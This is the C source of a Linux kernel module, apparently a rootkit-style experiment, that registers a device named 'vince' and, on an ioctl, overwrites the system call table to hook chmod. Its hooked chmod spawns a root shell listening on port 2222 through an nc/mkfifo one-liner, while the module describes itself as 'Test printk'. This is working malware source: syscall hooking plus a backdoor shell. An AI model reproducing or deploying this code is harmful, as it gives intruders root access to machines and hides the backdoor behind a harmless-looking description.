#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>
#include <asm/unistd.h>

#define IOCTL_START_VINCE 1
#define IOCTL_STOP_VINCE 0

static int our_open(struct inode *inode, struct file *file);
static int our_release(struct inode *inode, struct file *file);
static int our_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

asmlinkage int (*real_open)(const char* __user, int, int);
asmlinkage int (*real_chmod)(const char* __user, int);

unsigned long* sys_call_table = (unsigned long*) 0xffffffff8164e400;


asmlinkage int custom_open(const char* __user file_name, int flags, int mode)
{
	int status = real_open(__user file_name, flags, mode);
	printk("Open hooked\n");
	return status;
}

asmlinkage int custom_chmod(const char* __user file_name, int mode)
{
	char *argv[4];
	char *envp[4];
	int status = real_chmod(__user file_name, mode);
	int ret;
	printk("chmod hooked\n");

    //Create reverse shell
	argv[0] = "/bin/bash";
	argv[1] = "-c";
	argv[2] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 2222 >/tmp/f";
	argv[3] = NULL;

	envp[0] = "HOME=/";
	envp[1] = "TERM=linux";
	envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
	envp[3] = NULL;

	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	printk("result %d\n", ret);

	return status;
}

int make_rw(unsigned long address)
{
  unsigned int level;
  pte_t *pte = lookup_address(address, &level);
  if(pte->pte &~ _PAGE_RW)
    pte->pte |= _PAGE_RW;
  return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
  unsigned int level;
  pte_t *pte = lookup_address(address, &level);
  pte->pte = pte->pte &~ _PAGE_RW;
  return 0;
}

static const struct file_operations our_fops =\
{
	.owner = THIS_MODULE,
	.open = our_open,
	.release = our_release,
	.unlocked_ioctl = (void*)our_ioctl,
	.compat_ioctl = (void*)our_ioctl
};

int our_open(struct inode *inode, struct file *file)
{
	printk("Device Open\n");
	return 0;
}

int our_release(struct inode *inode, struct file *file)
{
	printk("Device Release\n");
	return 0;
}

int our_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	printk("Device ioctl\n");
	switch(cmd)
	{
		case IOCTL_START_VINCE:
			printk("IOCTL start\n");
			make_rw((unsigned long)sys_call_table);
			real_chmod = (void*)*(sys_call_table + __NR_chmod);
			*(sys_call_table + __NR_chmod) = (unsigned long)custom_chmod;
			make_ro((unsigned long)sys_call_table);
			break;
		case IOCTL_STOP_VINCE:
			printk("IOCTL stop\n");
			make_rw((unsigned long)sys_call_table);
			*(sys_call_table + __NR_chmod) = (unsigned long)real_chmod;
			make_ro((unsigned long)sys_call_table);
			break;
		default:
			printk("Unknown ioctl\n");
			break;
	}
	return 0;
}

static struct miscdevice our_device = \
{
	MISC_DYNAMIC_MINOR,
	"vince",
	&our_fops
};

static int __init start_module(void)
{
        printk("Hello, world!\n");
	misc_register(&our_device);
        return 0;
}

module_init(start_module);

static void __exit stop_module(void)
{
        printk("Goodbye, world!\n");
	misc_deregister(&our_device);
}

module_exit(stop_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Toto <toto@toto.ti>");
MODULE_DESCRIPTION("Test printk");
MODULE_VERSION("1.0");

